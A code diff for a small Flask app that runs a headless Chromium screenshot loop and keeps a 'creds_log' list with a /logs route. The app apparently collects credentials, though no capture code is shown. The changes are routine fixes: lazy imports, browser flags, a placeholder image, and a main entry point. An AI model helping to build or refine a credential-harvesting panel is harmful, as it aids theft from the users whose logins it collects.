@@ -1,20 +1,26 @@
 import os
 import threading
 import time
-from flask import Flask, render_template, request, jsonify
-from playwright.sync_api import sync_playwright
+from flask import Flask, render_template, request, jsonify, send_from_directory
 from datetime import datetime
 
 app = Flask(__name__)
 STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
+TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
 os.makedirs(STATIC_DIR, exist_ok=True)
+
+# Ensure Flask knows where templates are
+app.template_folder = TEMPLATE_DIR
 
 creds_log = []
 
 def screenshot_loop():
     try:
+        from playwright.sync_api import sync_playwright
         with sync_playwright() as p:
-            browser = p.chromium.launch(args=['--no-sandbox', '--disable-setuid-sandbox'])
+            browser = p.chromium.launch(
+                args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
+            )
             page = browser.new_page(viewport={'width': 1280, 'height': 720})
             page.goto('about:blank')
             while True:
@@ -26,6 +32,13 @@ def screenshot_loop():
                 time.sleep(1)
     except Exception as e:
         print(f"playwright init failed: {e}")
+        # Create a placeholder so the image route doesn't 404
+        try:
+            from PIL import Image
+            img = Image.new('RGB', (1280, 720), color='black')
+            img.save(os.path.join(STATIC_DIR, 'screenshot.png'))
+        except:
+            pass
 
 @app.route('/')
 def index():
@@ -55,7 +68,7 @@ def logs():
 def screenshot():
     path = os.path.join(STATIC_DIR, 'screenshot.png')
     if os.path.exists(path):
-        return app.send_static_file('screenshot.png')
+        return send_from_directory(STATIC_DIR, 'screenshot.png')
     return '', 404
 
 @app.before_request
@@ -64,3 +77,7 @@ def init_screenshot():
         app.screenshot_started = True
         t = threading.Thread(target=screenshot_loop, daemon=True)
         t.start()
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
